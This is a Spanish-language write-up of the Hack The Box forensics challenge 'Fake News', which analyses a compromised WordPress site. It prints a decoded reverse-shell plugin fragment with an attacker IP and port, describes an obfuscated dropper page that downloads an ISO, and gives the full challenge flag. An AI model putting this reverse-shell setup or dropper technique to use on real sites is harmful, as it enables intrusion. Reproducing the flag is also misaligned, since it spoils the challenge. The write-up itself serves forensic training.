---
title: "Fake News"
description: "Writeup de Fake News - Hack The Box - Forensics 200pts. ZIP con instalación WordPress comprometida; plugin malicioso plugin-manager.php con eval(base64_decode) revela parte 1 de la flag en PHP; index.php obfuscado descarga un ISO cuyo strings revela parte 2."
sidebar:
  badge:
    text: Forensics
    variant: note
tags:
  - htb
  - forensics
  - wordpress
  - php
  - eval
  - base64
  - iso
  - strings
  - webshell
  - supply-chain
---

# Fake News

> 🎯 Plataforma: Hack The Box
> 📂 Categoría: Forensics
> 🏆 Puntos: 200
> 👤 Autor: warrior866

---

## Descripción

El ZIP contiene una instalación completa de WordPress comprometida. El directorio `html/` tiene el sitio modificado con dos implantes: un plugin PHP malicioso (`plugin-manager.php`) con un reverse shell codificado en base64 que contiene la primera parte de la flag, y un `index.php` ofuscado que al ejecutarse descarga un archivo ISO. La segunda parte de la flag aparece con `strings` directamente en el ISO. Ambas partes se concatenan para obtener la flag completa.

---

## Análisis inicial: identificar archivos modificados

```bash
unzip -P 'hackthebox' a12c73cc-ac31-4397-ada4-e58e7e3f19e4.zip -d "fake-news"
cd fake-news/html

# Buscar archivos modificados recientemente (ataque ocurrió el 2022-11-23)
find . -newermt '2022-11-23' -type f
```

```
./wp-content/plugins/plugin-manager/plugin-manager.php
./wp-blogs/2022/11/index.php
```

Solo dos archivos fueron modificados el día del ataque — el resto del WordPress es legítimo.

---

## Análisis del plugin malicioso

```bash
cat wp-content/plugins/plugin-manager/plugin-manager.php
```

```php
<?php
eval(base64_decode("c2V0X3RpbWVfbGltaXQgKDApO..."));
?>
```

Decodificar el base64 revela un reverse shell PHP y un valor embebido:

```bash
echo "c2V0X3RpbWVfbGltaXQgKDApO..." | base64 -d
```

```php
set_time_limit(0);
$part1 = "HTB{C0m3_0n";
$VERSION = "1.0";
$ip = '77.74.198.52';
$port = 4444;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
// ... reverse shell PHP clásico
```

La parte 1 de la flag está hardcodeada como variable PHP: `$part1 = "HTB{C0m3_0n"`.

El C2 está en `77.74.198.52:4444` — la IP del atacante que instaló el plugin vía el panel de WordPress comprometido.

---

## Análisis del index.php ofuscado

```bash
ls -la wp-blogs/2022/11/index.php
# -rw-r--r-- 1 ... 301K ... index.php

file wp-blogs/2022/11/index.php
# PHP script, ASCII text, with CRLF line terminators
```

El archivo es de 301 KB — extremadamente grande para un `index.php`. Está altamente ofuscado con un blob de texto mezclado. Al servirlo con un servidor HTTP temporal y acceder a él, descarga un archivo ISO:

```bash
cd wp-blogs/2022/11/
python3 -m http.server 8000

# En otra terminal:
curl http://localhost:8000/index.php -o official_invitation.iso
```

---

## Extracción de la flag del ISO

```bash
file official_invitation.iso
# official_invitation.iso: ISO 9660 CD-ROM filesystem data 'CDROM'

strings official_invitation.iso | tail -100 | head -20
```

```text
...
_X3HJR}4s_t00_g00d_t0_b3_tru3}
part2:_1t_w4s_t00_g00d_t0_b3_tru3}
_1t_w4s_t00_g00d_t0_b3_tru3}
CDROM
...
```

La segunda parte de la flag aparece directamente en los strings del ISO: `_1t_w4s_t00_g00d_t0_b3_tru3}`.

---

## Reconstrucción de la flag

```
part1 = "HTB{C0m3_0n"     (del plugin-manager.php decodificado)
part2 = "_1t_w4s_t00_g00d_t0_b3_tru3}"  (del ISO via strings)
```

Flag completa: `HTB{C0m3_0n_1t_w4s_t00_g00d_t0_b3_tru3}` → **HTB{FLAG}**

---

## Cadena de Ataque

```text
1. Atacante compromete panel admin de WordPress (credenciales débiles o fuerza bruta)
       ↓
2. Instala plugin malicioso plugin-manager.php con reverse shell PHP a 77.74.198.52:4444
       ↓
3. Sube wp-blogs/2022/11/index.php (301KB ofuscado) — dropper de segunda etapa
       ↓
4. Víctimas que visitan /wp-blogs/2022/11/ descargan official_invitation.iso
       ↓
5. Plugin-manager.php: $part1 + ISO strings: part2 → flag completa
```

---

## Lecciones Aprendidas

- **Auditoría de plugins WordPress**: los plugins son el principal vector de compromiso en WordPress. Cualquier plugin puede ejecutar código PHP arbitrario — revisar siempre `eval()`, `base64_decode()`, `system()` con `grep -r "eval\|base64_decode\|system\|passthru" wp-content/plugins/`.
- **`find -newermt` para triage forense**: localizar archivos modificados en la fecha del incidente es el primer paso para identificar los IOCs (Indicators of Compromise) sin analizar todo el sitio.
- **ISO como contenedor de payload**: los archivos ISO son contenedores de sistema de archivos que rara vez se inspeccionan. `strings` es suficiente para un primer análisis — `7z` o `mount -o loop` para extracción completa.
- **Variables PHP embebidas**: los atacantes a veces hardcodean configuración (IP del C2, partes de flag, credenciales) directamente en el código PHP en lugar de un archivo de configuración externo.

---

## Referencias

- [HackTricks — WordPress Pentest](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress)
- [PHP Reverse Shell - Pentest Monkey](https://github.com/pentestmonkey/php-reverse-shell)
- [MITRE ATT&CK — Server Software Component: Web Shell](https://attack.mitre.org/techniques/T1505/003/)
